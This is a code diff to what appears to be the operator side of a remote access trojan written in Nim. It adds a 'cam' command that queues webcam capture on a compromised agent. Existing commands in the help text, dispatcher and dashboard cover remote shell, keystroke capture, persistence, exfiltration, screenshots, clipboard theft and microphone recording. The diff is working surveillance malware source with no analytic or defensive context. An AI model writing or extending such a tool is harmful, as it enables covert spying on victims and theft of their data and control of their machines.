@@ -508,6 +508,7 @@ proc helpText(): string =
            "  download/dl <id> <path>        - download file from agent\n" &
            "  upload/up <id> <remotepath> <base64>\n" &
            "  screenshot/ss <id>             - take screenshot\n" &
+           "  cam <id> [device]              - capture from default webcam (or device N) -> downloads/cam_<ts>.bmp\n" &
            "  mic/m <id> [seconds]          - capture mic audio (default 10s, max 120s) -> downloads/mic_<ts>.wav\n" &
            "  listen <id>                   - start live mic stream -> downloads/mic_live_<ts>.wav (ffplay -infbuf)\n" &
            "  unlisten <id>                 - stop live mic stream and finalize file\n" &
@@ -542,8 +543,8 @@ proc dispatch(line: string): string =
       for id, a in agents.pairs:
         result.add(id & "\t" & a.hostname & "\t" & a.username & "\t" &
                    a.osInfo & "\t" & a.age() & "\n")
-  of "shell", "sh", "download", "dl", "screenshot", "ss", "ps",
-     "clip", "find", "keys", "k", "persist", "p", "killdate",
+  of "shell", "sh", "download", "dl", "screenshot", "ss", "cam",
+     "ps", "clip", "find", "keys", "k", "persist", "p", "killdate",
      "sleep", "kill", "x", "exfil", "recon", "tg", "panic",
      "mic", "m", "listen", "unlisten":
     if p.len < 2: return "Usage: " & p[0] & " <id> [args]\n"
@@ -598,6 +599,15 @@ proc dispatch(line: string): string =
       withLock agentsLock:
         if p[1] in agents:
           agents[p[1]].cmdQueue.add(buildCmd("mic", argStr))
+          return "[" & BuildPrefix & " >] queued for " & p[1]
+        return "[!] not found: " & p[1]
+    elif cmd == "cam":
+      # cam <id> [device]  — device is optional, agent defaults to 0
+      if p.len < 2: return "Usage: " & p[0] & " <id> [device]\n"
+      let argStr = if p.len >= 3: p[2] else: ""
+      withLock agentsLock:
+        if p[1] in agents:
+          agents[p[1]].cmdQueue.add(buildCmd("cam", argStr))
           return "[" & BuildPrefix & " >] queued for " & p[1]
         return "[!] not found: " & p[1]
     elif cmd == "find":
@@ -737,6 +747,7 @@ const DASHBOARD_HTML = """
         <option>ps</option>
         <option>clip</option>
         <option>screenshot</option>
+        <option>cam</option>
         <option>mic</option>
         <option>listen</option>
         <option>find</option>
